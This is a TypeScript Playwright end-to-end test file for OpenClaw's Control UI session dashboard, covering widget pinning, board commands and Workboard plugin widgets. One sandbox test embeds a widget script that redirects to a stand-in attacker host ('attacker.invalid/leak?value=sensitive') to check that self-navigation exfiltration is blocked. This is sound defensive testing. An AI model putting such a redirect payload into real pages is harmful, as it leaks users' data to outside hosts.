// Control UI E2E covers the real session-dashboard provider and transcript bridge.
import { mkdir } from "node:fs/promises";
import path from "node:path";
import { chromium, type Browser, type Page } from "playwright";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { GATEWAY_SERVER_CAPS } from "../../../packages/gateway-protocol/src/index.js";
import { SANDBOX_HOST_PATH } from "../../../src/agents/sandbox-host.js";
import { createSandboxHostHttpServer } from "../../../src/gateway/mcp-app-sandbox-http.js";
import {
  canRunPlaywrightChromium,
  installMockGateway,
  resolvePlaywrightChromiumExecutablePath,
  startControlUiE2eServer,
  type ControlUiE2eServer,
} from "../test-helpers/control-ui-e2e.ts";

const chromiumExecutablePath = resolvePlaywrightChromiumExecutablePath(chromium.executablePath());
const chromiumAvailable = canRunPlaywrightChromium(chromiumExecutablePath);
const allowMissingChromium = process.env.OPENCLAW_UI_E2E_ALLOW_MISSING_CHROMIUM === "1";
const describeControlUiE2e = chromiumAvailable || !allowMissingChromium ? describe : describe.skip;
const cardboardProofDir = path.resolve(
  process.cwd(),
  ".artifacts/control-ui-e2e/workboard-cardboard",
);
const pluginWidgetsProofDir = path.resolve(
  process.cwd(),
  ".artifacts/control-ui-e2e/workboard-plugin-widgets",
);

let browser: Browser;
let server: ControlUiE2eServer;

const sessionKey = "agent:main:dashboard";
const boardSnapshot = {
  sessionKey,
  revision: 1,
  tabs: [
    { tabId: "main", title: "Main", position: 0, chatDock: "right" },
    { tabId: "research", title: "Research", position: 1, chatDock: "right" },
  ],
  widgets: [
    {
      name: "status",
      tabId: "main",
      title: "Status",
      contentKind: "html",
      sizeW: 6,
      sizeH: 4,
      position: 0,
      grantState: "pending",
      revision: 1,
      frameUrl: "about:blank#status",
    },
    {
      name: "sources",
      tabId: "research",
      title: "Sources",
      contentKind: "html",
      sizeW: 6,
      sizeH: 4,
      position: 0,
      grantState: "pending",
      revision: 1,
      frameUrl: "about:blank#sources",
    },
  ],
};
const pinnedBoardSnapshot = {
  ...boardSnapshot,
  revision: 2,
  widgets: [
    ...boardSnapshot.widgets,
    {
      name: "canvas-cv_release",
      tabId: "main",
      title: "Release status",
      contentKind: "html",
      sizeW: 6,
      sizeH: 4,
      position: 1,
      grantState: "pending",
      revision: 1,
      frameUrl: "about:blank#canvas-cv_release",
    },
  ],
};
const pinnedMcpAppBoardSnapshot = {
  ...boardSnapshot,
  revision: 2,
  widgets: [
    ...boardSnapshot.widgets,
    {
      name: "mcp-app-28b65635ecaa78ac",
      tabId: "main",
      title: "Demo App",
      contentKind: "mcp-app",
      sizeW: 6,
      sizeH: 4,
      position: 1,
      grantState: "pending",
      revision: 1,
      instanceId: "instance-pinned-app",
    },
  ],
};
const pluginWidgetBoardSnapshot = {
  sessionKey,
  revision: 1,
  tabs: [{ tabId: "main", title: "Main", position: 0, chatDock: "right" }],
  widgets: [
    {
      name: "workboard-card",
      tabId: "main",
      title: "Priority card",
      contentKind: "plugin",
      pluginKind: "workboard:card",
      props: { cardId: "card-widget-ready" },
      sizeW: 6,
      sizeH: 4,
      position: 0,
      grantState: "none",
      revision: 1,
    },
    {
      name: "workboard-summary",
      tabId: "main",
      title: "Platform summary",
      contentKind: "plugin",
      pluginKind: "workboard:mini",
      props: { boardId: "platform", limit: 2 },
      sizeW: 6,
      sizeH: 4,
      position: 1,
      grantState: "none",
      revision: 1,
    },
  ],
};

async function showDashboard(page: Page): Promise<void> {
  await page.addInitScript((key) => {
    const settingsKey = "openclaw.control.settings.v1:ws://127.0.0.1:18789";
    const settings = JSON.parse(localStorage.getItem(settingsKey) ?? "{}") as Record<
      string,
      unknown
    >;
    settings.boardSessionViews = {
      [key]: { face: "dashboard", activeTabId: "main" },
    };
    localStorage.setItem(settingsKey, JSON.stringify(settings));
  }, sessionKey);
}

function workboardConfigSnapshot(enabled = true) {
  const config = { plugins: { entries: { workboard: { enabled } } } };
  return {
    config,
    hash: "workboard-cardboard-e2e",
    path: "/tmp/openclaw-e2e/openclaw.json",
    raw: JSON.stringify(config),
    resolved: config,
    sourceConfig: config,
  };
}

describeControlUiE2e("Control UI session dashboard stitch", () => {
  beforeAll(async () => {
    server = await startControlUiE2eServer();
    browser = await chromium.launch({ executablePath: chromiumExecutablePath });
  });

  afterAll(async () => {
    await browser?.close();
    await server?.close();
  });

  it("keeps widget documents in standards mode and cancels self-navigation", async () => {
    const sandboxHost = createSandboxHostHttpServer();
    await new Promise<void>((resolve, reject) => {
      sandboxHost.once("error", reject);
      sandboxHost.listen(0, "127.0.0.1", () => {
        sandboxHost.off("error", reject);
        resolve();
      });
    });
    const sandboxAddress = sandboxHost.address();
    if (!sandboxAddress || typeof sandboxAddress === "string") {
      throw new Error("sandbox host did not bind a TCP address");
    }
    const context = await browser.newContext();
    try {
      const page = await context.newPage();
      const escapeRequests: string[] = [];
      page.on("request", (request) => {
        if (request.url().startsWith("https://attacker.invalid/")) {
          escapeRequests.push(request.url());
        }
      });
      await page.goto(server.baseUrl);
      await page.evaluate((sandboxUrl) => {
        Reflect.set(globalThis, "widgetProbes", []);
        addEventListener("message", (event) => {
          (Reflect.get(globalThis, "widgetProbes") as unknown[]).push(event.data);
        });
        const frame = document.createElement("iframe");
        frame.src = sandboxUrl;
        document.body.replaceChildren(frame);
      }, `http://127.0.0.1:${sandboxAddress.port}${SANDBOX_HOST_PATH}`);
      await expect
        .poll(async () =>
          page.evaluate(() =>
            (Reflect.get(globalThis, "widgetProbes") as Array<{ method?: string }>).some(
              (probe) => probe?.method === "ui/notifications/sandbox-proxy-ready",
            ),
          ),
        )
        .toBe(true);

      const widgetHtml = `<!doctype html><html><body><script>
        parent.postMessage({
          compatMode: document.compatMode,
        }, "*");
        setTimeout(() => {
          location.href = "https://attacker.invalid/leak?value=sensitive";
        }, 0);
      </script></body></html>`;
      await page.locator("iframe").evaluate((frame, html) => {
        (frame as HTMLIFrameElement).contentWindow?.postMessage(
          {
            method: "ui/notifications/sandbox-resource-ready",
            params: { html },
          },
          "*",
        );
      }, widgetHtml);
      await expect
        .poll(async () =>
          page.evaluate(() =>
            (
              Reflect.get(globalThis, "widgetProbes") as Array<{
                compatMode?: string;
              }>
            ).filter((probe) => probe?.compatMode),
          ),
        )
        .toEqual([{ compatMode: "CSS1Compat" }]);
      const sandboxFrame = await page
        .locator("iframe")
        .elementHandle()
        .then((handle) => handle?.contentFrame());
      const widgetFrame = sandboxFrame?.childFrames()[0];
      expect(widgetFrame).toBeDefined();
      await page.waitForTimeout(250);
      expect(widgetFrame!.url()).not.toContain("attacker.invalid");
      expect(escapeRequests).toEqual([]);
    } finally {
      await context.close();
      await new Promise<void>((resolve, reject) => {
        sandboxHost.close((error) => (error ? reject(error) : resolve()));
      });
    }
  });

  it("pins Canvas HTML, follows board commands, and persists dock resizing", async () => {
    const context = await browser.newContext({ viewport: { height: 900, width: 1280 } });
    const page = await context.newPage();
    const gateway = await installMockGateway(page, {
      sessionKey,
      featureCapabilities: [GATEWAY_SERVER_CAPS.BOARD_WIDGET_PUT_CANVAS_DOC],
      featureMethods: [
        "board.get",
        "board.update",
        "board.widget.grant",
        "board.widget.put",
        "chat.metadata",
        "chat.startup",
      ],
      historyMessages: [
        {
          role: "assistant",
          content: [
            {
              type: "canvas",
              preview: {
                kind: "canvas",
                surface: "assistant_message",
                render: "url",
                title: "Release status",
                viewId: "cv_release",
                url: "/__openclaw__/canvas/documents/cv_release/index.html",
                preferredHeight: 240,
                sandbox: "scripts",
              },
            },
          ],
          timestamp: 1,
        },
      ],
      methodResponses: {
        "board.get": boardSnapshot,
        "board.widget.put": pinnedBoardSnapshot,
      },
    });
    await showDashboard(page);

    await page.goto(`${server.baseUrl}chat`);
    await expect
      .poll(async () => (await gateway.getRequests("board.get")).length, { timeout: 30_000 })
      .toBeGreaterThan(0);
    await page.locator('wa-radio[value="dashboard"]').waitFor();
    await page.locator(".board-session-surface").waitFor();

    const preview = page.locator('.chat-tool-card__preview[data-kind="canvas"]');
    await preview.hover();
    await preview.getByRole("button", { name: "Pin to dashboard" }).click();
    await expect.poll(async () => (await gateway.getRequests("board.widget.put")).length).toBe(1);
    expect((await gateway.getRequests("board.widget.put"))[0]?.params).toEqual({
      sessionKey,
      name: "canvas-cv_release",
      title: "Release status",
      content: { kind: "canvas-doc", docId: "cv_release" },
    });
    await expect
      .poll(() => preview.getByRole("button", { name: "Pinned" }).isDisabled())
      .toBe(true);
    await gateway.setMethodResponse("board.get", pinnedBoardSnapshot);

    await gateway.emitGatewayEvent("board.command", {
      sessionKey,
      command: { kind: "focus_tab", tabId: "research" },
    });
    const researchTab = page.locator('[data-board-tab-id="research"]');
    await expect.poll(() => researchTab.getAttribute("active")).not.toBeNull();

    const divider = page.locator(".board-session-surface__divider");
    const dock = page.locator(".board-session-surface__chat");
    await divider.focus();
    await page.keyboard.press("End");
    await expect.poll(() => dock.getAttribute("style")).not.toBe("width: 420px");
    const persistedStyle = await dock.getAttribute("style");
    expect(persistedStyle).toMatch(/^width: \d+(?:\.\d+)?px$/u);

    await page.reload();
    await page.locator(".board-session-surface__chat").waitFor();
    expect(await page.locator(".board-session-surface__chat").getAttribute("style")).toBe(
      persistedStyle,
    );
    await expect
      .poll(() =>
        page.locator('.chat-tool-card__preview[data-kind="canvas"] [data-pin-widget]').isDisabled(),
      )
      .toBe(true);
    await context.close();
  });

  it("pins an inline MCP App using only its session-bound view identity", async () => {
    const context = await browser.newContext({ viewport: { height: 900, width: 1280 } });
    const page = await context.newPage();
    const gateway = await installMockGateway(page, {
      sessionKey,
      featureCapabilities: [],
      featureMethods: [
        "board.get",
        "board.widget.appView",
        "board.widget.put",
        "chat.metadata",
        "chat.startup",
      ],
      historyMessages: [
        {
          role: "assistant",
          content: [
            {
              type: "canvas",
              preview: {
                kind: "canvas",
                surface: "assistant_message",
                render: "url",
                title: "Demo App",
                viewId: "outer-view-must-not-be-pinned",
                mcpApp: {
                  viewId: "view-session-bound",
                  serverName: "forbidden-server",
                  toolName: "forbidden-tool",
                  uiResourceUri: "ui://forbidden/app.html",
                  originSessionKey: sessionKey,
                  toolCallId: "forbidden-call",
                },
              },
            },
          ],
          timestamp: 1,
        },
      ],
      methodResponses: {
        "board.get": boardSnapshot,
        "board.widget.appView": {
          viewId: "view-pinned-lease",
          expiresAtMs: Date.now() + 60_000,
        },
        "board.widget.put": pinnedMcpAppBoardSnapshot,
      },
    });
    await showDashboard(page);

    await page.goto(`${server.baseUrl}chat`);
    await page.locator(".board-session-surface").waitFor();
    const preview = page.locator('.chat-tool-card__preview[data-kind="canvas"]');
    await preview.hover();
    await preview.getByRole("button", { name: "Pin to dashboard" }).click();

    await expect.poll(async () => (await gateway.getRequests("board.widget.put")).length).toBe(1);
    expect((await gateway.getRequests("board.widget.put"))[0]?.params).toEqual({
      sessionKey,
      name: "mcp-app-28b65635ecaa78ac",
      title: "Demo App",
      content: { kind: "mcp-app", viewId: "view-session-bound" },
    });
    await expect
      .poll(() => preview.getByRole("button", { name: "Pinned" }).isDisabled())
      .toBe(true);
    await context.close();
  });

  it("renders and updates active Workboard plugin widgets", async () => {
    const recordProof = process.env.OPENCLAW_UI_E2E_RECORD === "1";
    if (recordProof) {
      await mkdir(pluginWidgetsProofDir, { recursive: true });
    }
    const context = await browser.newContext({
      viewport: { height: 900, width: 1280 },
      ...(recordProof
        ? { recordVideo: { dir: pluginWidgetsProofDir, size: { height: 900, width: 1280 } } }
        : {}),
    });
    const page = await context.newPage();
    const readyCard = {
      id: "card-widget-ready",
      title: "Rebase plugin widget kinds",
      status: "ready",
      priority: "high",
      labels: ["dashboard"],
      position: 1,
      createdAt: 1,
      updatedAt: 2,
      agentId: "main",
      metadata: { automation: { boardId: "platform" } },
    };
    const runningCard = { ...readyCard, status: "running", updatedAt: 3 };
    const gateway = await installMockGateway(page, {
      sessionKey,
      controlUiWidgetKinds: [
        { pluginId: "workboard", kind: "workboard:card", label: "Workboard card" },
        { pluginId: "workboard", kind: "workboard:mini", label: "Workboard summary" },
      ],
      featureMethods: [
        "board.get",
        "chat.metadata",
        "chat.startup",
        "workboard.cards.list",
        "workboard.cards.move",
      ],
      methodResponses: {
        "board.get": pluginWidgetBoardSnapshot,
        "workboard.cards.list": {
          cards: [
            readyCard,
            {
              ...readyCard,
              id: "card-widget-running",
              title: "Already running",
              status: "running",
              position: 2,
            },
          ],
          statuses: ["ready", "running", "done"],
        },
        "workboard.cards.move": { card: runningCard },
      },
    });
    await showDashboard(page);

    try {
      await page.goto(`${server.baseUrl}chat`);
      const cardWidget = page.locator('[data-test-id="workboard-card-widget"]');
      const miniWidget = page.locator('[data-test-id="workboard-mini-widget"]');
      await cardWidget.waitFor();
      await miniWidget.waitFor();
      await expect.poll(() => cardWidget.textContent()).toContain("Rebase plugin widget kinds");
      await expect.poll(() => miniWidget.textContent()).toContain("Already running");
      expect(await miniWidget.getByRole("link", { name: "Open board" }).getAttribute("href")).toBe(
        "/workboard?board=platform",
      );
      if (recordProof) {
        await page.screenshot({
          path: path.join(pluginWidgetsProofDir, "01-plugin-widgets-ready.png"),
        });
      }

      await cardWidget.getByRole("combobox").selectOption("running");
      const moveRequest = await gateway.waitForRequest("workboard.cards.move");
      expect(moveRequest.params).toEqual({
        id: "card-widget-ready",
        status: "running",
        position: 3,
      });
      await expect.poll(() => cardWidget.textContent()).toContain("Running");
      await gateway.setMethodResponse("workboard.cards.list", {
        cards: [
          runningCard,
          {
            ...readyCard,
            id: "card-widget-running",
            title: "Already running",
            status: "running",
            position: 2,
          },
        ],
        statuses: ["ready", "running", "done"],
      });
      await gateway.emitGatewayEvent("plugin.workboard.changed", {
        epoch: "plugin-widget-e2e",
        revision: 2,
      });
      await expect
        .poll(async () =>
          (await miniWidget.locator('[title="Running"]').textContent())
            ?.replace(/\s+/gu, " ")
            .trim(),
        )
        .toBe("2 Running");
      if (recordProof) {
        await page.screenshot({
          path: path.join(pluginWidgetsProofDir, "02-plugin-widgets-running.png"),
        });
      }
    } finally {
      const video = page.video();
      await context.close();
      if (recordProof && video) {
        await video.saveAs(path.join(pluginWidgetsProofDir, "workboard-plugin-widgets.webm"));
      }
    }
  });

  it("links a dispatched Workboard card and its live session dashboard in both directions", async () => {
    const recordProof = process.env.OPENCLAW_UI_E2E_RECORD === "1";
    if (recordProof) {
      await mkdir(cardboardProofDir, { recursive: true });
    }
    const context = await browser.newContext({
      viewport: { height: 900, width: 1280 },
      ...(recordProof
        ? { recordVideo: { dir: cardboardProofDir, size: { height: 900, width: 1280 } } }
        : {}),
    });
    const page = await context.newPage();
    const card = {
      id: "card-dashboard-stitch",
      title: "Ship dashboard stitch",
      status: "running",
      priority: "high",
      labels: ["ui"],
      position: 1000,
      createdAt: 1,
      updatedAt: 2,
      sessionKey,
      runId: "run-dashboard-stitch",
      metadata: { automation: { boardId: "platform" } },
    };
    const gateway = await installMockGateway(page, {
      sessionKey,
      featureMethods: [
        "board.get",
        "chat.metadata",
        "chat.startup",
        "config.get",
        "sessions.list",
        "tasks.list",
        "workboard.cards.list",
      ],
      methodResponses: {
        "board.get": boardSnapshot,
        "config.get": workboardConfigSnapshot(),
        "tasks.list": { nextCursor: null, tasks: [] },
        "workboard.cards.list": { cards: [card], statuses: ["running", "done"] },
      },
    });
    await showDashboard(page);

    try {
      await page.goto(`${server.baseUrl}chat`);
      const chip = page.locator(".board-session-surface__workboard-chip");
      await chip.waitFor();
      await expect.poll(() => chip.textContent()).toContain("Ship dashboard stitch");
      await expect.poll(() => chip.textContent()).toContain("Running");
      expect(await chip.getAttribute("href")).toBe("/workboard?board=platform");
      if (recordProof) {
        await page.screenshot({ path: path.join(cardboardProofDir, "01-dashboard-card-chip.png") });
      }

      const completedCard = { ...card, status: "done", updatedAt: 3 };
      await gateway.setMethodResponse("workboard.cards.list", {
        cards: [completedCard],
        statuses: ["running", "done"],
      });
      await gateway.emitGatewayEvent("plugin.workboard.changed", {
        epoch: "cardboard-e2e",
        revision: 2,
      });
      await expect.poll(() => chip.textContent()).toContain("Done");

      await gateway.setMethodResponse("workboard.cards.list", {
        cards: [],
        statuses: ["running", "done"],
      });
      await gateway.emitGatewayEvent("plugin.workboard.changed", {
        epoch: "cardboard-e2e",
        revision: 3,
      });
      await expect.poll(() => chip.count()).toBe(0);

      await gateway.setMethodResponse("workboard.cards.list", {
        cards: [completedCard],
        statuses: ["running", "done"],
      });
      await gateway.emitGatewayEvent("plugin.workboard.changed", {
        epoch: "cardboard-e2e",
        revision: 4,
      });
      await chip.waitFor();

      await chip.click();
      await page.waitForURL(/\/workboard\?board=platform$/u);
      const workboardCard = page.locator(".workboard-card", {
        hasText: "Ship dashboard stitch",
      });
      await workboardCard.waitFor();
      await workboardCard.click();
      const cardDashboard = page.locator("openclaw-workboard-card-dashboard");
      await cardDashboard.waitFor();
      await expect
        .poll(() =>
          cardDashboard.locator(".workboard-card-dashboard__toggle").getAttribute("aria-expanded"),
        )
        .toBe("true");
      await cardDashboard.locator("openclaw-board-view").waitFor();
      if (recordProof) {
        await page.screenshot({
          path: path.join(cardboardProofDir, "02-workboard-card-dashboard.png"),
        });
      }

      await gateway.setMethodResponse("board.get", {
        sessionKey,
        revision: 3,
        tabs: [],
        widgets: [],
      });
      await gateway.emitGatewayEvent("board.changed", { sessionKey });
      await cardDashboard
        .getByText("No dashboard yet — the working agent can pin widgets.")
        .waitFor();
    } finally {
      const video = page.video();
      await context.close();
      if (recordProof && video) {
        await video.saveAs(path.join(cardboardProofDir, "workboard-cardboard.webm"));
      }
    }
  });

  it("omits the Workboard breadcrumb when its plugin or the session board is unavailable", async () => {
    const cases = [
      {
        name: "plugin disabled",
        board: boardSnapshot,
        config: workboardConfigSnapshot(false),
      },
      {
        name: "board empty",
        board: { sessionKey, revision: 1, tabs: [], widgets: [] },
        config: workboardConfigSnapshot(),
      },
    ];

    for (const testCase of cases) {
      const context = await browser.newContext({ viewport: { height: 900, width: 1280 } });
      const page = await context.newPage();
      const gateway = await installMockGateway(page, {
        sessionKey,
        featureMethods: [
          "board.get",
          "chat.metadata",
          "chat.startup",
          "config.get",
          "workboard.cards.list",
        ],
        methodResponses: {
          "board.get": testCase.board,
          "config.get": testCase.config,
          "workboard.cards.list": {
            cards: [
              {
                id: `card-${testCase.name.replaceAll(" ", "-")}`,
                title: testCase.name,
                status: "running",
                priority: "normal",
                labels: [],
                position: 1,
                createdAt: 1,
                updatedAt: 2,
                sessionKey,
                metadata: { automation: { boardId: "platform" } },
              },
            ],
            statuses: ["running"],
          },
        },
      });
      await showDashboard(page);

      try {
        await page.goto(`${server.baseUrl}chat`);
        await expect
          .poll(async () => (await gateway.getRequests("board.get")).length)
          .toBeGreaterThan(0);
        await expect
          .poll(() => page.locator(".board-session-surface__workboard-chip").count())
          .toBe(0);
        expect(await gateway.getRequests("workboard.cards.list")).toHaveLength(0);
      } finally {
        await context.close();
      }
    }
  });
});
